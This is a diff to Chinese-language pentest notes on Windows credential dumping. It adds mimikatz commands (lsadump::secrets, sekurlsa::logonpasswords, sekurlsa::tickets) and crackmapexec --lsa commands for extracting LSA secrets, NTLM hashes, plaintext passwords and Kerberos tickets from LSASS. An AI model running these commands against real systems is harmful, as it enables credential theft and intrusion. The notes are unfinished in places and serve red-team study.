@@ -13,15 +13,40 @@ description: 枚举用户名 + 密码喷洒 = 获取有效凭证 / 枚举出用�
 
 ### LAS Secrets
 
-
-
-
-
-### LSASS Process
-
 *
 
+```powershell
+# 使用mimikatz提取
+mimikatz.exe
+privilege::debug
+lsadump::secrets
+```
 
+```bash
+ # 使用crackmapexec提取
+ crackmapexec smb 192.168.xxx.xxx -u 用户名 -p 密码 --lsa
+```
+
+```bash
+# shiyo
+```
+
+### LSASS进程
+
+* 从LSASS进程中提取存储在内存中的NTLM哈希、明文密码、Kerberos 票据：
+
+```powershell
+# 使用mimikatz提取
+mimikatz.exe
+privilege::debug
+sekurlsa::logonpasswords
+sekurlsa::tickets
+```
+
+```bash
+# 使用crackmapexec提取
+crackmapexec smb 192.168.xxx.xxx -u 用户名 -p 密码 --lsa
+```
 
 ### LSASS Protection bypass
 
